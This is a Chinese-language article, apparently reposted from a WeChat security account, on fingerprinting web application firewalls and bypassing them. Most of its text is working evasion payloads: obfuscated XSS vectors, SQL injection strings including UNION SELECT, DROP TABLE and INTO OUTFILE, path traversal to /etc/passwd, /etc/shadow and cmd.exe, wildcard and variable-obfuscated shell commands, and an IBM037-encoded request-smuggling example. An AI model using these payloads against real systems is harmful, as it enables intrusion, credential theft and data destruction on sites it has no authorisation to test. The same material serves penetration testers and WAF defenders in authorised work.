> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/K4mZK2DG6aPRZVewjaN1PA)

**什么是 WAF**
-----------

Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品，旨在检测和阻止 Web 应用程序上的网络攻击。WAF 作用于 OSI 模型的应用层。

渗透测试时，首先要确定 web 应用的真实 IP 地址，WAF 类型，然后尝试绕过 WAF。

**总结使用 WAF 的原因**
----------------

*   深度防御策略。
    
*   检测并阻止针对易受攻击的 Web 应用程序的攻击。
    
*   防范各种漏洞。 
    
*   保护公司的网络环境。
    

**受欢迎的 WAF 供应商**                
--------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwIeOB3VWpOwqicYw8h7PvKssSvSqbFQ9TEv60F2XibrNdIx6C2BN5BNW6Yb11UL1ibjaCBZzTIib8NaQ/640?wx_fmt=png)

**如何找到 WAF 类型和真实 IP 地址**
------------------------

1. 使用 shodan.io 或 censys.io

2. 搜索 SPF 记录和 TXT 记录。

SPF 和 TXT 记录可能存在原始的 IP 地址。

3. 也可以在 “历史数据” 中进行检索，在旧记录中可能具有原始 IP。

查找域名、IP 地址等历史数据：securitytrails.com

### **如何证明 WAF 已经正确设置**

*   WAF 使用标准端口 80、443、8000、8008、8080 和 8088 端口。
    
*   WAF 在请求中设置自己的 cookie。
    
*   WAF 将自己与单独的标头关联。
    
*   WAF 在服务器标头中公开自己。
    
*   WAF 在响应内容中公开自己。
    
*   WAF 会根据恶意请求以唯一的响应代码进行响应。
    
*   从浏览器发送标准 GET 请求，拦截并记录响应头（特定的 cookie）。
    
*   从命令行发送请求（例如 cURL），然后检查响应内容和标头。
    
*   将 GET 请求发送到随机打开的端口，并检查可能暴露 WAF 身份的标语。
    
*   尝试一些 SQL 注入 playload，例如：“” 或 1 = 1 - 登录表单或忘记密码。
    
*   在某些输入字段中尝试使用 XSS 有效 playload，例如 <script> confirm（）</ script>。
    
*   尝试将../../../etc/passwd 添加到 URL 地址中的随机参数中。
    
*   将 URL 末尾的一些有效 playload（例如 “OR SLEEP（5）OR）” 添加到 url 作为随机参数。
    
*   使用过时的协议（例如 HTTP / 0.9）发送 GET 请求（HTTP / 0.9 不支持 POST 类型的查询）。
    
*   根据不同类型的交互检查服务器标头。
    
*   将原始的 FIN＆RST 数据包发送到服务器并识别响应。
    
*   边通道攻击–检查请求和响应内容的计时行为。
    

### **检查和绕过 WAF 的工具**

w3af — Web 应用程序攻击和审核框架

wafw00f —识别和指纹 Web 应用程序防火墙

BypassWAF –通过滥用 DNS 历史记录来绕过防火墙。该工具将搜索旧的 DNS A 记录，并检查服务器是否对该域进行答复。 

CloudFail –是一种战术侦察工具，试图在 Cloudflare WAF 后面找到原始 IP 地址。

**绕过 WAF 的技术**
--------------

### **1. 大小写转换技术**

*   组合大写和小写字符以创建有效的有效内容。
    

基本要求：

<script>confirm()</script>

绕过的技术：

<ScrIpT>confirm()</sCRiPt>

基本要求：

SELECT * FROM * WHERE OWNER = 'NAME_OF_DB'

绕过的技术：

sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

URL 中的示例：

http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4

### **2. URL 编码技术**

*   使用％编码 / URL 编码对普通有效载荷进行编码。
    
*   您可以使用 Burp。它具有编码器 / 解码器工具。
    

被 WAF 阻止：

<Svg/x=">"/OnLoAD=confirm()//

绕过的技术：

%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F

被 WAF 阻止：

UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)

绕过的技术：

UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29

URL 中的示例：

https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

### **3. Unicode 技术**

*   Unicode 编码的 ASCII 字符为我们提供了绕过 WAF 的绝佳变体。
    
*   对整个或部分有效载荷进行编码以获得结果。
    

基本要求：

<marquee onstart=prompt()>

混淆：

<marquee onstart=\u0070r\u06f\u006dpt()>

被 WAF 阻止：

/?redir=http://google.com

绕过的技术：

/?redir=http://google。com (Unicode alternative)

被 WAF 阻止：

<marquee loop=1 onfinish=alert()>x

绕过的技术：

＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative)

基本要求：

../../etc/shadow

混淆：

%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow

### **4. HTML 编码技术**

*   Web 应用将特殊字符编码为 HTML。对它们进行编码和渲染。
    
*   基本的绕过情况，带有 HTML 编码的数字和通用编码。
    

基本要求：

"><img src=x onerror=confirm()>

编码有效载荷：

&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt; 

编码有效载荷：

&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62; 

### **5. 混合编码技术**

*   这样的规则通常倾向于滤除特定类型的编码。
    
*   混合编码有效载荷可绕过此类过滤器。
    
*   换行符和选项卡，进一步增加了混淆。
    

混淆负载：

<A HREF="h  
tt p://6 6.000146.0x7.147/">XSS</A>

### **6. 使用注释技术**

*   注释使标准有效载荷向量模糊不清。
    
*   不同的有效载荷具有不同的混淆方式。
    

被 WAF 阻止：

<script>confirm()</script>

绕过的技术：

<!--><script>confirm/**/()/**/</script>

被 WAF 阻止：

/?id=1+union+select+1,2--

绕过的技术：

/?id=1+un/**/ion+sel/**/ect+1,2--

*   在攻击字符串中间插入注释。例如，/ *！SELECT * / 可能会被 WAF 忽略，但会传递到目标应用程序并由 mysql 数据库进行处理。
    

URL 中的示例：

index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4   

   'union%a0select pass from users#

URL 中的示例：

index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3

###  **7. 双重编码技术**

*   Web 应用程序防火墙策略倾向于对字符进行编码以保护 Web 应用程序。
    
*   较差的过滤器（没有递归过滤器）可以通过双重编码来绕过。
    

基本要求：

http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

混淆负载：

http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

基本要求：

<script>confirm()</script>

混淆负载：

%253Cscript%253Econfirm()%253C%252Fscript%253E

### **8. 通配符混淆技术**

*   各种命令行实用程序使用全局模式来处理多个文件。
    
*   我们可以更改它们以运行系统命令。
    

基本要求：

/bin/cat /etc/passwd

混淆负载：

/???/??t /???/??ss??

二手字符：

/ ? t s

基本要求：

/bin/nc 127.0.0.1 443

混淆负载：

/???/n? 2130706433 443

二手字符：

/ ? n [0-9]

动态有效载荷生成技术：

*   编程语言具有不同的连接模式和语法。
    
*   这使我们能够生成可以绕过许多过滤器和规则的有效载荷。
    

基本要求：

<script>confirm()</script>

混淆负载：

<script>eval('con'+'fi'+'rm()')</script>

基本要求：

/bin/cat /etc/shadow

混淆负载：

/bi'n'''/c''at' /e'tc'/sh''ad'ow

Bash 允许执行路径串联。

基本要求：

<iframe/onload='this["src"]="javascript:confirm()"';>

混淆负载

<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>

### **9. 垃圾字符技术**

*   WAF 可以轻松过滤掉简单的有效负载。
    
*   添加一些垃圾字符有助于避免检测（仅在特定情况下）。
    
*   此技术通常有助于混淆基于正则表达式的防火墙。
    

基本要求：

<script>confirm()</script>

混淆负载：

<script>+-+-1-+-+confirm()</script>

基本要求：

<BODY onload=confirm()>

混淆负载：

<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>

基本要求：

<a href=javascript;alert()>ClickMe

绕过的技术：

<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe

### 10. 换行技术

*   许多具有基于正则表达式的 WAF 可以有效地阻止许多尝试。
    
*   换行技术（CR 和 LF）可以破坏防火墙的正则表达式并绕过某些东西。
    

基本要求：

<iframe src=javascript:confirm(hacker)">

混淆负载：

<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">

### **11. 未初始化的变量技术**

*   可以使用未初始化的 bash 变量规避基于正则表达式的错误过滤器。
    
*   该值等于 null，其作用类似于空字符串。
    
*   Bash 和 Perl 允许这种解释。
    

一级混淆：正常

*   基本要求：  
    /bin/cat /etc/shadow
    
*   混淆负载：  
    /bin/cat$u /etc/shadow$u
    

二级混淆：基于位置

*   基本要求：  
    /bin/cat /etc/shadow
    
*   混淆负载：  
    $u/bin$u/cat$u $u/etc$u/shadow$u
    

第三层混淆：随机字符

*   基本要求：  
    /bin/cat /etc/passwd
    
*   混淆负载：  
    $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
    

### **12. 制表符和换行技术**

*   选项卡通常有助于规避防火墙，尤其是基于正则表达式的防火墙。
    
*   当正则表达式需要空格而不是制表符时，制表符可以帮助打破 WAF 正则表达式。
    

基本要求：

<IMG SRC="javascript:confirm();">

绕过的技术：

<IMG SRC="javascript:confirm();">

变体：

<IMG SRC="jav ascri pt:confirm ();">

基本要求：

http://test.com/test?id=1 union select 1,2,3

绕过的技术：

http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3

基本要求：

<iframe src=javascript:confirm()></iframe>

混淆负载：

<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>

### **13. 令牌破坏者技术**

*   对令牌的攻击企图打破使用令牌中断器将请求拆分为令牌的逻辑。
    
*   令牌破坏器是允许影响字符串的元素和某个令牌之间的对应关系的符号。
    
*   使用令牌破坏器时，我们的请求必须保持有效。
    
*   案例研究：令牌生成器的未知令牌
    

我们的有效载荷：

?id=‘-sqlite_version() UNION SELECT passwords FROM users --

*   案例研究：解析器的未知上下文（注意无上下文的括号）
    

第一有效载荷：

?id=12);DROP TABLE users --

第二有效载荷：

?id=133) INTO OUTFILE ‘xxx’ --

### **14. 其他格式的混淆**

*   许多 Web 应用程序支持不同的编码类型，并且可以解释编码。
    
*   我们始终需要将有效负载混淆为 WAF 不支持的格式，但是服务器会走私我们的有效负载。
    

IIS 案例： 

*   IIS 6、7.5、8 和 10 允许 IBM037 字符解释。
    
*   发送带有查询的编码参数。
    

原始请求：

POST /example.aspx?id7=sometext HTTP/1.1  
HOST: target.org  
Content-Type: application/x-www-form-urlencoded; charset=utf-8  
Content-Length: 27  
id2='union all select * from users--

带有 URL 编码的混淆请求：

POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1  
HOST: target.org  
Content-Type: application/x-www-form-urlencoded; charset=ibm037  
Content-Length: 127  
%89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60

**总结：**

让我们总结一下以上所有内容。尝试使用不同的编码技术，其中一些会起作用。不要只是检查 DNS 记录，因为只有尝试不同的方法，你才能成功绕过 waf。

不要忘记，Web 资源中可以绕过任何保护措施，WAF 并不是解决所有问题的灵丹妙药。攻击者不会停止技术研究，而是一直在寻找新技术来攻击你的网络资产。

原创投稿作者：justone

公众号

**觉得不错点个 **“赞”**、“在看”，支持下小编****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**